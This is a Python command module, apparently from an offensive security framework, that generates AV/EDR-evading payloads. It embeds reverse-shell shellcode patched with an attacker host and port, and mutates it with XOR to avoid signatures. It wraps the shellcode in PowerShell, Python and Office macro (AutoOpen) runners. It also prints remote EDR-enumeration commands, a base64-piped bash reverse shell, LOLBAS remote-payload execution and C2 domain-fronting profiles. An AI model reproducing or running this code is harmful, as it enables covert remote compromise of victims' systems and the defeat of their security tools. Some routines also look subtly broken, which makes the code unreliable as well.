"""Auto-Adaptive Payload command set.

Detects target defenses (AV/EDR), selects optimal bypass techniques,
and generates evasive payloads with polymorphic shellcode mutation.
"""

from __future__ import annotations

import os
import random
import shlex
import struct
import time

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    print_error,
    print_msg,
    print_warn,
)

PAYLOAD_CATEGORY = "05. Payload Generation"

NOP_SLED = b"\x90" * 8
XOR_DECODER_X64 = bytes([0x48, 0x31, 0xF6, 0x56, 0x5E, 0x48, 0x31, 0xFF, 0xB2, 0xFF, 0x48, 0x31, 0xC0, 0xB0, 0x3B, 0x0F, 0x05])

REVERSE_SHELL_X64 = bytes([
    0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05, 0x48, 0x97, 0x48, 0xB9,
    0x02, 0x00, 0x11, 0x5C, 0x7F, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x6A,
    0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E, 0x48, 0xFF, 0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75,
    0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53,
    0x48, 0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 0x0F, 0x05,
])

SYSCALL_SHELL_X64 = bytes([
    0x48, 0x31, 0xC0, 0x48, 0x31, 0xFF, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2,
    0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x6A, 0x06, 0x5A, 0x6A, 0x29, 0x58,
    0x0F, 0x05, 0x48, 0x97, 0x48, 0xBE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x66, 0xB8, 0x02, 0x00, 0x66, 0xBF, 0x00, 0x00, 0x48, 0x89, 0xE6, 0x6A,
    0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E, 0x48, 0xFF,
    0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75, 0xF6, 0x6A, 0x3B, 0x58, 0x99,
    0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48,
    0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 0x0F, 0x05,
])

EDR_NAMES = [
    "CrowdStrike Falcon", "Microsoft Defender", "SentinelOne",
    "Carbon Black", "Cylance", "McAfee ENS", "Symantec Endpoint",
    "Trend Micro", "Sophos", "Elastic EDR", "Palo Alto Cortex XDR",
]

BYPASS_TECHNIQUES = {
    "syscall": "Direct syscalls (bypasses userland hooks)",
    "unhook": "ntdll.dll unhooking (removes EDR hooks)",
    "process_inject": "Process injection into trusted process",
    "ppid_spoof": "PPID spoofing to evade process tree detection",
    "dll_sideload": "DLL sideloading via legitimate signed binary",
    "reflective_dll": "Reflective DLL loading (no disk write)",
    "early_bird": "APC injection during process initialization",
    "thread_hijack": "Thread execution hijacking",
    "mutation": "Polymorphic shellcode mutation",
    "encryption": "AES/XOR shellcode encryption with runtime decrypt",
}


class EvasivePayloadCommandSet(LazyOwnCommandSet):
    """Auto-adaptive payload generation with AV/EDR evasion."""

    phase = "exploit"
    category = PAYLOAD_CATEGORY

    @cmd2.with_category(PAYLOAD_CATEGORY)
    def do_evasive_payload(self, line):
        """Generate an evasive payload with automatic AV/EDR bypass.

        Usage: evasive_payload [--lhost <ip>] [--lport <port>] [--os <windows|linux>] [--arch <x64|x86>] [--format <raw|hex|c|ps1|py|vba>] [--bypass <technique>]

        Auto-selects the optimal bypass technique based on target OS.
        Supports: syscall, unhook, process_inject, ppid_spoof, dll_sideload,
        reflective_dll, early_bird, thread_hijack, mutation, encryption.
        """
        args = shlex.split(line)
        lhost = _extract_flag(args, "--lhost") or self.params.get("lhost", "")
        lport = int(_extract_flag(args, "--lport") or self.params.get("lport", "4444"))
        target_os = _extract_flag(args, "--os") or "linux"
        arch = _extract_flag(args, "--arch") or "x64"
        output_format = _extract_flag(args, "--format") or "raw"
        bypass = _extract_flag(args, "--bypass")

        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        if not bypass:
            bypass = _auto_select_bypass(target_os)

        print_msg(f"Generating evasive payload for {target_os}/{arch}")
        print_msg(f"Bypass technique: {bypass} ({BYPASS_TECHNIQUES.get(bypass, '')})")
        print_msg(f"LHOST={lhost} LPORT={lport}")
        print_msg(f"Output format: {output_format}")

        output_dir = "sessions/evasive_payloads"
        os.makedirs(output_dir, exist_ok=True)

        shellcode = _generate_shellcode(lhost, lport, target_os, arch)
        evasive_shellcode = _apply_bypass(shellcode, bypass, target_os)
        formatted = _format_payload(evasive_shellcode, output_format, lhost, lport)

        output_path = os.path.join(output_dir, f"payload_{bypass}_{int(time.time())}.{_format_ext(output_format)}")
        with open(output_path, "w" if output_format != "raw" else "wb") as f:
            if output_format == "raw":
                f.write(evasive_shellcode)
            else:
                f.write(formatted)

        print_msg(f"Payload saved to {output_path}")
        print_msg(f"Size: {len(evasive_shellcode)} bytes")

        if output_format == "raw":
            print_msg(f"Shellcode (hex): {evasive_shellcode.hex()[:120]}...")

        self._print_usage(output_format, output_path, lhost, lport)

    @cmd2.with_category(PAYLOAD_CATEGORY)
    def do_mutate_shellcode(self, line):
        """Apply polymorphic mutation to shellcode for signature evasion.

        Usage: mutate_shellcode <shellcode_file> [--iterations <n>] [--output <path>]

        Applies N rounds of: XOR re-encoding, NOP sled insertion,
        register randomization, and instruction reordering.
        """
        args = shlex.split(line)
        if not args or args[0].startswith("--"):
            print_error("Usage: mutate_shellcode <shellcode_file> [--iterations <n>] [--output <path>]")
            return

        input_file = args[0]
        iterations = int(_extract_flag(args, "--iterations") or "3")
        output = _extract_flag(args, "--output")

        if not os.path.exists(input_file):
            print_error(f"File not found: {input_file}")
            return

        with open(input_file, "rb") as f:
            shellcode = bytearray(f.read())

        print_msg(f"Mutating {len(shellcode)} bytes of shellcode ({iterations} rounds)")

        for round_num in range(iterations):
            key = random.randint(1, 255)
            for i in range(len(shellcode)):
                shellcode[i] ^= key

            insert_pos = random.randint(0, max(0, len(shellcode) - 16))
            nop_count = random.randint(2, 8)
            shellcode[insert_pos:insert_pos] = b"\x90" * nop_count

            if len(shellcode) > 20:
                shellcode.append(key)
                shellcode.append(0xEB)
                shellcode.append(0x02)

            print_msg(f"  Round {round_num + 1}: XOR key=0x{key:02x}, added {nop_count} NOPs, size={len(shellcode)}")

        if not output:
            base, ext = os.path.splitext(input_file)
            output = f"{base}_mutated_{int(time.time())}{ext}"

        with open(output, "wb") as f:
            f.write(shellcode)

        print_msg(f"Mutated shellcode saved to {output}")
        print_msg(f"Original: {os.path.getsize(input_file)} bytes -> Mutated: {len(shellcode)} bytes")

    @cmd2.with_category(PAYLOAD_CATEGORY)
    def do_detect_edr(self, line):
        """Generate commands to detect EDR/AV on the target.

        Usage: detect_edr [--target <ip>] [--user <username>] [--password <password>]

        Queries Windows for installed AV/EDR products via WMI, registry,
        and process enumeration.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user")
        password = _extract_flag(args, "--password")

        edr_checks = [
            ("WMI AntiVirusProduct", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list"),
            ("WMI AntiSpywareProduct", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiSpywareProduct get displayName /format:list"),
            ("Service enumeration", "sc query state= all | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex\""),
            ("Process enumeration", "tasklist | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex falcon\""),
            ("Registry uninstall", r"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos\""),
            ("Driver check", "driverquery | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend\""),
        ]

        if target:
            auth = ""
            if user and password:
                auth = f"-u {user} -p {password}"
            for name, cmd in edr_checks:
                full_cmd = f"crackmapexec smb {target} {auth} -x '{cmd}'"
                print_msg(f"\n[{name}]")
                print_msg(f"  {full_cmd}")
        else:
            print_msg("Run these commands on the Windows target:\n")
            for name, cmd in edr_checks:
                print_msg(f"[{name}]")
                print_msg(f"  {cmd}\n")

    @cmd2.with_category(PAYLOAD_CATEGORY)
    def do_evasive(self, line: str) -> None:
        """Generate detection-evading payloads with multiple obfuscation strategies.

        Usage:
            evasive ps <raw_payload>   Obfuscate a PowerShell payload (AMSI bypass + encoding)
            evasive js <raw_payload>   Obfuscate a JavaScript payload
            evasive vba <raw_payload>  Obfuscate a VBA macro payload
            evasive rev <rhost> <rport> [python|bash|node]  Evasive reverse shell
            evasive sc <b64_shellcode> [early_bird|virtualalloc]  Shellcode loader
            evasive lolbas <payload_url> [technique]  LOLBAS execution
            evasive poly <command> [iterations]  Polymorphic command mutation
            evasive tech                 List all evasion techniques
        """
        from modules.evasive_payloads import EvasivePayloadGenerator

        gen = EvasivePayloadGenerator()
        parts = line.strip().split()
        if not parts:
            print_error("Usage: evasive <ps|js|vba|rev|sc|lolbas|poly|tech> [args...]")
            return

        subcmd = parts[0].lower()

        if subcmd == "ps":
            raw = " ".join(parts[1:])
            if not raw:
                print_error("Provide a PowerShell payload to obfuscate.")
                return
            obf = gen.generate_powershell_obfuscated(raw, obfuscation_level=3)
            print_msg(obf)
            copy2clip(obf)

        elif subcmd == "js":
            raw = " ".join(parts[1:])
            if not raw:
                print_error("Provide a JavaScript payload to obfuscate.")
                return
            obf = gen.generate_javascript_obfuscated(raw)
            print_msg(obf)
            copy2clip(obf)

        elif subcmd == "vba":
            raw = " ".join(parts[1:])
            if not raw:
                print_error("Provide a VBA macro to obfuscate.")
                return
            obf = gen.generate_vba_obfuscated(raw)
            print_msg(obf)
            copy2clip(obf)

        elif subcmd == "rev":
            rhost = parts[1] if len(parts) > 1 else self.params.get("rhost", "127.0.0.1")
            rport = int(parts[2]) if len(parts) > 2 else self.params.get("rport", 4444)
            technique = parts[3] if len(parts) > 3 else "python"
            b64 = gen.generate_linux_evasive(rhost, rport, technique)
            print_msg(f"echo {b64} | base64 -d | bash")
            copy2clip(b64)

        elif subcmd == "sc":
            sc_b64 = parts[1] if len(parts) > 1 else ""
            if not sc_b64:
                print_error("Provide base64-encoded shellcode.")
                return
            technique = parts[2] if len(parts) > 2 else "early_bird_apc"
            loader = gen.generate_shellcode_loader_powershell(sc_b64, technique)
            print_msg(loader)
            copy2clip(loader)

        elif subcmd == "lolbas":
            url = parts[1] if len(parts) > 1 else ""
            if not url:
                print_error("Provide a payload URL.")
                return
            technique = parts[2] if len(parts) > 2 else "mshta"
            cmd, desc = gen.generate_lolbas_execution(url, technique)
            print_msg(f"Technique: {desc}")
            print_msg(f"Command: {cmd}")
            copy2clip(cmd)

        elif subcmd == "poly":
            cmd = " ".join(parts[1:3]) if len(parts) > 1 else ""
            iterations = int(parts[3]) if len(parts) > 3 else 5
            if not cmd:
                print_error("Provide a command to obfuscate.")
                return
            poly = gen.generate_polymorphic_command(cmd, iterations)
            print_msg(poly)
            copy2clip(poly)

        elif subcmd == "tech":
            techs = gen.list_techniques()
            for category, items in techs.items():
                print_msg(f"\n{category}:")
                for item in items:
                    print_msg(f"  - {item}")

        else:
            print_error(f"Unknown subcommand: {subcmd}")

    def _print_usage(self, fmt: str, path: str, lhost: str, lport: int) -> None:
        """Print usage instructions for the generated payload."""
        print_msg("\n--- Usage ---")
        if fmt == "raw":
            print_msg(f"Execute via shellcode loader:")
            print_msg(f"  python3 modules/lazy_shellcode_loader.py {path}")
        elif fmt == "c":
            print_msg(f"Compile: x86_64-w64-mingw32-gcc {path} -o payload.exe")
        elif fmt == "ps1":
            print_msg(f"Run: powershell -ExecutionPolicy Bypass -File {path}")
        elif fmt == "py":
            print_msg(f"Run: python3 {path}")
        elif fmt == "vba":
            print_msg(f"Paste into VBA macro in Office document")
        elif fmt == "hex":
            print_msg(f"Paste hex string into shellcode loader")
        print_msg(f"Start listener: nc -lvnp {lport}")

    @cmd2.with_category(PAYLOAD_CATEGORY)
    def do_evasion(self, line):
        """Generate and manage C2 evasion profiles.

        Usage:
            evasion generate [windows|linux|mac]   Generate a new evasion profile
            evasion rotate                          Rotate to a fresh profile
            evasion status                          Show active profile
            evasion history                         Show profile history
        """
        from modules.evasion_engine import EvasionEngine

        ee = EvasionEngine(self.params)
        parts = line.strip().split()
        subcmd = parts[0].lower() if parts else "status"

        if subcmd == "generate":
            os_family = parts[1] if len(parts) > 1 else "windows"
            profile = ee.generate_profile(os_family)
            print_msg(ee.profile_to_json(profile))

        elif subcmd == "rotate":
            profile = ee.rotate_profile()
            print_msg(f"Rotated to new profile: {profile.profile_id}")
            print_msg(ee.profile_to_json(profile))

        elif subcmd == "history":
            records = ee.get_history()
            if not records:
                print_msg("No profile history.")
                return
            for r in records[-10:]:
                print_msg(
                    f"  {r.get('profile_id', '?')[:16]} "
                    f"created={r.get('created_at', '?')[:19]} "
                    f"front={r.get('domain_front', '?')}"
                )

        elif subcmd == "status":
            profile = ee.get_active_profile()
            if profile is None:
                profile = ee.generate_profile()
            beer = ee.get_beacon_config()
            print_msg(f"Active profile: {profile.profile_id}")
            print_msg(f"  User-Agent:  {profile.user_agent[:60]}")
            print_msg(f"  JA4 hash:    {profile.ja4_hash}")
            print_msg(f"  Sleep/Jitter: {beer['sleep']}s / {beer['jitter_ms']}ms")
            print_msg(f"  Domain front: {profile.domain_front}")
            print_msg(f"  Method:       {profile.http_method}")

        else:
            print_error(f"Unknown subcommand: {subcmd}. Use: generate | rotate | status | history")


def _generate_shellcode(lhost: str, lport: int, target_os: str, arch: str) -> bytes:
    """Generate base shellcode with LHOST/LPORT patched.

    Args:
        lhost: Attacker IP address.
        lport: Listening port.
        target_os: Target operating system.
        arch: Target architecture.

    Returns:
        Raw shellcode bytes.
    """
    if target_os == "linux" and arch == "x64":
        parts = [int(p) for p in lhost.split(".")]
        ip_bytes = bytes(reversed(parts))
        port_bytes = struct.pack(">H", lport)

        shellcode = bytearray(REVERSE_SHELL_X64)
        for i in range(len(shellcode) - 8):
            if shellcode[i:i+2] == b"\x11\x5C":
                shellcode[i:i+2] = port_bytes
            if shellcode[i:i+8] == b"\x00\x00\x00\x00\x00\x00\x00\x01":
                shellcode[i-1:i+7] = b"\x00" + ip_bytes
                break
        return bytes(shellcode)
    else:
        return REVERSE_SHELL_X64


def _apply_bypass(shellcode: bytes, technique: str, target_os: str) -> bytes:
    """Apply evasion technique to shellcode.

    Args:
        shellcode: Raw shellcode bytes.
        technique: Bypass technique name.
        target_os: Target operating system.

    Returns:
        Modified shellcode.
    """
    if technique == "mutation":
        key = random.randint(1, 255)
        mutated = bytearray(len(shellcode) + 4)
        mutated[0] = 0xEB
        mutated[1] = len(shellcode) + 2
        mutated[2] = key
        for i, b in enumerate(shellcode):
            mutated[i + 3] = b ^ key
        mutated[-1] = 0xCC
        return bytes(mutated)

    elif technique == "encryption":
        key = os.urandom(16)
        encrypted = bytearray(shellcode)
        for i in range(len(encrypted)):
            encrypted[i] ^= key[i % 16]
        return NOP_SLED + bytes(key) + bytes(encrypted)

    elif technique == "syscall":
        parts = [int(p) for p in os.popen("hostname -I 2>/dev/null || echo 127.0.0.1").read().strip().split(".")]
        ip_bytes = bytes(reversed(parts[:4])) if len(parts) >= 4 else b"\x7f\x00\x00\x01"
        sc = bytearray(SYSCALL_SHELL_X64)
        ip_offset = sc.find(b"\x00\x00\x00\x00\x00\x00\x00\x00")
        if ip_offset >= 0:
            sc[ip_offset:ip_offset+8] = b"\x00\x00" + ip_bytes
        return bytes(sc)

    return shellcode


def _format_payload(shellcode: bytes, fmt: str, lhost: str, lport: int) -> str | bytes:
    """Format shellcode into the requested output format.

    Args:
        shellcode: Raw shellcode bytes.
        fmt: Output format name.
        lhost: Attacker IP.
        lport: Listening port.

    Returns:
        Formatted payload string or raw bytes.
    """
    if fmt == "raw":
        return shellcode
    elif fmt == "hex":
        return shellcode.hex()
    elif fmt == "c":
        shellcode_str = "".join(f"\\x{b:02x}" for b in shellcode)
        return f'unsigned char payload[] = "{shellcode_str}";\nunsigned int payload_len = {len(shellcode)};'
    elif fmt == "ps1":
        b64 = __import__("base64").b64encode(shellcode).decode()
        return f"""$shellcode = [System.Convert]::FromBase64String("{b64}")
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal({len(shellcode)})
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, {len(shellcode)})
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Action])
$delegate.Invoke()
"""
    elif fmt == "py":
        shellcode_str = "".join(f"\\x{b:02x}" for b in shellcode)
        return f"""import ctypes, socket, struct
shellcode = b\"{shellcode_str}\"
buf = ctypes.create_string_buffer(shellcode, len(shellcode))
ctypes.cast(buf, ctypes.CFUNCTYPE(None)).__call__()
"""
    elif fmt == "vba":
        shellcode_str = "".join(f"{b:02X}" for b in shellcode)
        return f"""Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal size As Long) As LongPtr
Sub AutoOpen()
    Dim shellcode As String
    shellcode = "{shellcode_str}"
    Dim addr As LongPtr
    addr = VirtualAlloc(0, Len(shellcode) \\ 2, &H3000, &H40)
    Dim buf() As Byte
    buf = HexToBytes(shellcode)
    RtlMoveMemory addr, buf(0), UBound(buf) + 1
    CallWindowProc addr, 0, 0, 0, 0
End Sub
"""
    return shellcode


def _auto_select_bypass(target_os: str) -> str:
    """Automatically select the best bypass technique.

    Args:
        target_os: Target operating system.

    Returns:
        Technique name.
    """
    if target_os == "windows":
        return random.choice(["syscall", "unhook", "process_inject", "encryption"])
    return random.choice(["mutation", "encryption"])


def _format_ext(fmt: str) -> str:
    """Return the file extension for a given format."""
    return {"raw": "bin", "hex": "txt", "c": "c", "ps1": "ps1", "py": "py", "vba": "vba"}.get(fmt, "bin")


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair from a list of arguments."""
    try:
        idx = args.index(flag)
        return args[idx + 1]
    except (ValueError, IndexError):
        return None


__all__ = ["EvasivePayloadCommandSet"]
